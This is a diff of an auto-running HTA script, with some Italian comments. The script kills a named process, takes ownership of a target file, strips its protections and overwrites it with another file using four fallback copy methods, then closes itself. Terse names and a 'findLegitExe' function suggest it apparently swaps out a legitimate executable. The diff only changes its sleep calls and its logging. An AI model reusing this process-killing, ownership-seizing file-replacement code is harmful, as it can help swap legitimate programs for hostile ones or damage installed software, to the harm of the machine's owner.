@@ -54,7 +54,6 @@ Function ForceKillProcess(pn)
     Dim sh
     Set sh = CreateObject("WScript.Shell")
     sh.Run "taskkill /F /IM " & pn, 0, True
-    WScript.Sleep 500
 End Function
 
 Function RemoveReadOnly(path)
@@ -75,7 +74,6 @@ Function TakeOwnership(path)
     Dim sh
     Set sh = CreateObject("WScript.Shell")
     sh.Run "takeown /F """ & path & """", 0, True
-    WScript.Sleep 300
 End Function
 
 Function BinaryCopyMethod1(sf, tf)
@@ -119,7 +117,6 @@ Function BinaryCopyMethod3(sf, tf)
     Dim sh
     Set sh = CreateObject("WScript.Shell")
     sh.Run "cmd /c copy /Y """ & sf & """ """ & tf & """", 0, True
-    WScript.Sleep 500
     
     Dim fso
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -135,7 +132,6 @@ Function BinaryCopyMethod4(sf, tf)
     Dim sh
     Set sh = CreateObject("WScript.Shell")
     sh.Run "powershell -Command ""Copy-Item -Path '" & sf & "' -Destination '" & tf & "' -Force""", 0, True
-    WScript.Sleep 500
     
     Dim fso
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -156,23 +152,17 @@ Function AdvancedBinaryCopy(sf, tf)
         Exit Function
     End If
     
-    WScript.Sleep 300
-    
     success = BinaryCopyMethod2(sf, tf)
     If success Then
         AdvancedBinaryCopy = "Method2-FSO"
         Exit Function
     End If
     
-    WScript.Sleep 300
-    
     success = BinaryCopyMethod3(sf, tf)
     If success Then
         AdvancedBinaryCopy = "Method3-CMD"
         Exit Function
     End If
-    
-    WScript.Sleep 300
     
     success = BinaryCopyMethod4(sf, tf)
     If success Then
@@ -229,12 +219,17 @@ function log(msg) {
     logMessages.push(logMsg);
 }
 
-function saveLogs() {
+function sleep(ms) {
+    return new Promise(function(resolve) {
+        window.setTimeout(resolve, ms);
+    });
+}
+
+async function saveLogs() {
     try {
         var fso = new ActiveXObject("Scripting.FileSystemObject");
         var sh = new ActiveXObject("WScript.Shell");
         
-        // Salva in %TEMP% che è sempre scrivibile
         var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
         var logPath = fso.BuildPath(tempPath, "replace_log_" + Date.now() + ".txt");
         
@@ -250,9 +245,12 @@ function saveLogs() {
         
         ts.Close();
         log("Logs saved to: " + logPath);
+        
+        // Mostra anche un alert con il path
+        alert("Log saved to:\n" + logPath);
         return true;
     } catch(e) {
-        // Fallback: prova sul desktop
+        log("Error saving to TEMP: " + e.message);
         try {
             var sh2 = new ActiveXObject("WScript.Shell");
             var fso2 = new ActiveXObject("Scripting.FileSystemObject");
@@ -270,8 +268,12 @@ function saveLogs() {
             }
             
             ts2.Close();
+            log("Logs saved to Desktop: " + logPath2);
+            alert("Log saved to Desktop:\n" + logPath2);
             return true;
         } catch(e2) {
+            log("Error saving to Desktop: " + e2.message);
+            alert("FAILED to save log!\nError: " + e2.message);
             return false;
         }
     }
@@ -353,7 +355,7 @@ function findLegitExe() {
     return fallback;
 }
 
-function waitForTermination(pn, maxWait) {
+async function waitForTermination(pn, maxWait) {
     log("Waiting for " + pn + " to terminate (max " + maxWait + "s)...");
     
     for (var i = 0; i < maxWait; i++) {
@@ -362,14 +364,14 @@ function waitForTermination(pn, maxWait) {
             log("Process terminated after " + (i + 1) + "s");
             return true;
         }
-        WScript.Sleep(1000);
+        await sleep(1000);
     }
     
     log("Timeout after " + maxWait + "s, process still running");
     return false;
 }
 
-function ex() {
+async function ex() {
     log("=== REPLACE OPERATION START ===");
     
     var pn = p();
@@ -381,7 +383,7 @@ function ex() {
     
     if (!tf || tf === "") {
         log("ERROR: No target path, aborting");
-        saveLogs();
+        await saveLogs();
         window.close();
         return;
     }
@@ -393,14 +395,14 @@ function ex() {
     
     if (!fso.FileExists(sf)) {
         log("ERROR: Source not found");
-        saveLogs();
+        await saveLogs();
         window.close();
         return;
     }
     
     if (!fso.FileExists(tf)) {
         log("ERROR: Target not found");
-        saveLogs();
+        await saveLogs();
         window.close();
         return;
     }
@@ -413,38 +415,38 @@ function ex() {
     // STEP 1: Force kill process
     log("STEP 1: Killing process...");
     ForceKillProcess(pn);
-    WScript.Sleep(1000);
+    await sleep(1000);
     
     var terminated = !GetProcessByName(pn);
     if (!terminated) {
         log("First kill failed, trying again...");
         ForceKillProcess(pn);
-        WScript.Sleep(1000);
+        await sleep(1000);
         terminated = !GetProcessByName(pn);
     }
     
     if (!terminated) {
         log("WARNING: Process still running, continuing anyway...");
-        waitForTermination(pn, 10);
+        await waitForTermination(pn, 10);
     } else {
         log("Process killed successfully");
     }
     
-    WScript.Sleep(500);
+    await sleep(500);
     
     // STEP 2: Take ownership e rimuovi protezioni
     log("STEP 2: Taking ownership and removing protections...");
     TakeOwnership(tf);
-    WScript.Sleep(300);
+    await sleep(500);
     RemoveReadOnly(tf);
-    WScript.Sleep(300);
+    await sleep(500);
     
     // STEP 3: REPLACE con 4 metodi diversi
     log("STEP 3: Executing replace with multiple methods...");
     var method = AdvancedBinaryCopy(sf, tf);
     log("Replace result: " + method);
     
-    WScript.Sleep(500);
+    await sleep(500);
     
     // STEP 4: Verifica
     log("STEP 4: Verification...");
@@ -468,22 +470,21 @@ function ex() {
     }
     
     log("=== REPLACE OPERATION END ===");
-    saveLogs();
+    await saveLogs();
     
-    WScript.Sleep(1000);
+    await sleep(2000);
     window.close();
 }
 
 window.onload = function() {
     log("HTA loaded, starting in 500ms...");
     window.setTimeout(function() { 
-        try {
-            ex(); 
-        } catch(e) {
+        ex().catch(function(e) {
             log("FATAL: " + e.message);
-            saveLogs();
-            window.close();
-        }
+            saveLogs().then(function() {
+                window.close();
+            });
+        });
     }, 500);
 };
 </script>
